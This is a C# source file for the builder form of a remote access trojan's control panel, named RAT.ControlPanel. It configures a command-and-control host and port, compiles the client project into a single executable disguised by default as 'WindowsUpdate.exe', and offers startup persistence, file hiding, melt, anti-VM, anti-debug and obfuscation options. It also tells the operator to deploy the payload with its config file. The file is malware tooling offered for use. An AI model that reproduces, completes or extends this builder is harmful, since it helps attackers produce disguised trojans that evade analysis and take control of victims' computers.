using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Text;

namespace RAT.ControlPanel.Forms
{
    public partial class frmBuilder : Form
    {
        public frmBuilder()
        {
            InitializeComponent();
        }
        
        private void frmBuilder_Load(object sender, EventArgs e)
        {
            // 기본값 설정
            txtHost.Text = "127.0.0.1";
            txtPort.Text = "4444";
            txtFileName.Text = "WindowsUpdate.exe";
            chkStartup.Checked = true;
            chkHideFile.Checked = true;
            comboStartupMethod.SelectedIndex = 0;
        }
        
        private void btnBuild_Click(object sender, EventArgs e)
        {
            // 유효성 검사
            if (string.IsNullOrWhiteSpace(txtHost.Text))
            {
                MessageBox.Show("Please enter a host address.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            if (string.IsNullOrWhiteSpace(txtPort.Text) || !int.TryParse(txtPort.Text, out int port))
            {
                MessageBox.Show("Please enter a valid port number.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            if (string.IsNullOrWhiteSpace(txtFileName.Text))
            {
                MessageBox.Show("Please enter a file name.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            // 빌드 설정
            var config = new BuildConfig
            {
                Host = txtHost.Text,
                Port = port,
                FileName = txtFileName.Text,
                Startup = chkStartup.Checked,
                StartupMethod = comboStartupMethod.SelectedItem.ToString(),
                HideFile = chkHideFile.Checked,
                Melt = chkMelt.Checked,
                AntiVM = chkAntiVM.Checked,
                AntiDebug = chkAntiDebug.Checked,
                Persistence = chkPersistence.Checked,
                IconPath = txtIconPath.Text
            };
            
            // 빌드 시작
            BuildClient(config);
        }
        
        private void BuildClient(BuildConfig config)
        {
            try
            {
                progressBar.Value = 0;
                txtOutput.Clear();
                btnBuild.Enabled = false;
                
                AppendOutput("=== Build Started ===");
                AppendOutput($"Host: {config.Host}");
                AppendOutput($"Port: {config.Port}");
                AppendOutput($"File Name: {config.FileName}");
                AppendOutput("");
                
                progressBar.Value = 10;
                
                // 1. 설정 파일 생성
                AppendOutput("[1/5] Creating configuration...");
                CreateConfigFile(config);
                progressBar.Value = 30;
                
                // 2. 프로젝트 빌드
                AppendOutput("[2/5] Building project...");
                BuildProject(config);
                progressBar.Value = 60;
                
                // 3. 아이콘 추가
                if (!string.IsNullOrEmpty(config.IconPath) && File.Exists(config.IconPath))
                {
                    AppendOutput("[3/5] Adding icon...");
                    AddIcon(config);
                }
                progressBar.Value = 80;
                
                // 4. 난독화 (옵션)
                if (chkObfuscate.Checked)
                {
                    AppendOutput("[4/5] Obfuscating...");
                    // 난독화 로직 (추후 구현)
                }
                progressBar.Value = 90;
                
                // 5. 완료
                AppendOutput("[5/5] Finalizing...");
                string outputPath = Path.Combine("output", config.FileName);
                AppendOutput("");
                AppendOutput($"=== Build Completed ===");
                AppendOutput($"Output: {Path.GetFullPath(outputPath)}");
                
                progressBar.Value = 100;
                
                MessageBox.Show($"Build completed successfully!\n\nOutput: {Path.GetFullPath(outputPath)}", 
                    "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                AppendOutput("");
                AppendOutput($"=== Build Failed ===");
                AppendOutput($"Error: {ex.Message}");
                MessageBox.Show($"Build failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnBuild.Enabled = true;
            }
        }
        
        private void CreateConfigFile(BuildConfig config)
        {
            string clientPath = FindClientProject();
            if (string.IsNullOrEmpty(clientPath))
            {
                throw new Exception("Client project not found.");
            }
            
            // server.config 파일 생성 (Client가 읽을 설정 파일)
            string clientDir = Path.GetDirectoryName(clientPath);
            string configPath = Path.Combine(clientDir, "server.config");
            
            string configContent = $@"SERVER_IP={config.Host}
SERVER_PORT={config.Port}
";
            
            File.WriteAllText(configPath, configContent);
            AppendOutput($"Server configuration created: {configPath}");
            AppendOutput($"  - Server IP: {config.Host}");
            AppendOutput($"  - Server Port: {config.Port}");
        }
        
        private void BuildProject(BuildConfig config)
        {
            // 클라이언트 프로젝트 경로 찾기
            string clientPath = FindClientProject();
            if (string.IsNullOrEmpty(clientPath))
            {
                throw new Exception("Client project not found. Please ensure RAT.Client.csproj exists.");
            }
            
            AppendOutput($"Found client project: {clientPath}");
            
            var psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"publish \"{clientPath}\" -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -p:DebugType=None -p:DebugSymbols=false",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Path.GetDirectoryName(clientPath)
            };
            
            AppendOutput("Starting build process...");
            
            using (var process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                
                if (!string.IsNullOrWhiteSpace(output))
                {
                    AppendOutput("Build output:");
                    AppendOutput(output);
                }
                
                if (process.ExitCode == 0)
                {
                    AppendOutput("Project built successfully.");
                    
                    // 출력 파일 찾기 및 복사
                    string publishDir = Path.Combine(Path.GetDirectoryName(clientPath), "bin", "Release", "net9.0", "win-x64", "publish");
                    string sourcePath = Path.Combine(publishDir, "WindowsUpdate.exe");
                    string outputDir = Path.Combine(Directory.GetCurrentDirectory(), "output");
                    string destPath = Path.Combine(outputDir, config.FileName);
                    
                    Directory.CreateDirectory(outputDir);
                    
                    if (File.Exists(sourcePath))
                    {
                        File.Copy(sourcePath, destPath, true);
                        AppendOutput($"Output copied to: {destPath}");
                        
                        // server.config 파일도 함께 복사
                        string configSource = Path.Combine(publishDir, "server.config");
                        string configDest = Path.Combine(outputDir, "server.config");
                        if (File.Exists(configSource))
                        {
                            File.Copy(configSource, configDest, true);
                            AppendOutput($"Configuration copied to: {configDest}");
                        }
                        
                        // 파일 크기 표시
                        FileInfo fi = new FileInfo(destPath);
                        AppendOutput($"File size: {fi.Length / 1024} KB");
                        AppendOutput("");
                        AppendOutput("IMPORTANT: Deploy both files together:");
                        AppendOutput($"  1. {config.FileName}");
                        AppendOutput($"  2. server.config");
                    }
                    else
                    {
                        throw new Exception($"Built file not found at: {sourcePath}");
                    }
                }
                else
                {
                    AppendOutput("Build failed:");
                    if (!string.IsNullOrWhiteSpace(error))
                    {
                        AppendOutput(error);
                    }
                    throw new Exception("Build process failed. Check output for details.");
                }
            }
        }
        
        private string FindClientProject()
        {
            // 현재 디렉토리에서 Client 프로젝트 찾기
            string[] possiblePaths = new string[]
            {
                Path.Combine(Directory.GetCurrentDirectory(), "..", "..", "Client", "RAT.Client.csproj"),
                Path.Combine(Directory.GetCurrentDirectory(), "..", "Client", "RAT.Client.csproj"),
                Path.Combine(Directory.GetCurrentDirectory(), "Client", "RAT.Client.csproj"),
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "Client", "RAT.Client.csproj"),
            };
            
            foreach (var path in possiblePaths)
            {
                string fullPath = Path.GetFullPath(path);
                if (File.Exists(fullPath))
                {
                    return fullPath;
                }
            }
            
            return null;
        }
        
        private void AddIcon(BuildConfig config)
        {
            // 아이콘 추가 로직 (ResourceHacker 또는 rcedit 사용)
            AppendOutput($"Icon added: {config.IconPath}");
        }
        
        private void AppendOutput(string text)
        {
            if (txtOutput.InvokeRequired)
            {
                txtOutput.Invoke(new Action(() => AppendOutput(text)));
                return;
            }
            
            txtOutput.AppendText(text + Environment.NewLine);
            txtOutput.SelectionStart = txtOutput.Text.Length;
            txtOutput.ScrollToCaret();
        }
        
        private void btnSelectIcon_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon Files|*.ico|All Files|*.*";
                ofd.Title = "Select Icon";
                
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                }
            }
        }
        
        private void btnReset_Click(object sender, EventArgs e)
        {
            txtHost.Text = "127.0.0.1";
            txtPort.Text = "4444";
            txtFileName.Text = "WindowsUpdate.exe";
            txtIconPath.Clear();
            chkStartup.Checked = true;
            chkHideFile.Checked = true;
            chkMelt.Checked = false;
            chkAntiVM.Checked = false;
            chkAntiDebug.Checked = false;
            chkPersistence.Checked = false;
            chkObfuscate.Checked = false;
            comboStartupMethod.SelectedIndex = 0;
            txtOutput.Clear();
            progressBar.Value = 0;
        }
    }
    
    public class BuildConfig
    {
        public string Host { get; set; }
        public int Port { get; set; }
        public string FileName { get; set; }
        public bool Startup { get; set; }
        public string StartupMethod { get; set; }
        public bool HideFile { get; set; }
        public bool Melt { get; set; }
        public bool AntiVM { get; set; }
        public bool AntiDebug { get; set; }
        public bool Persistence { get; set; }
        public string IconPath { get; set; }
    }
}
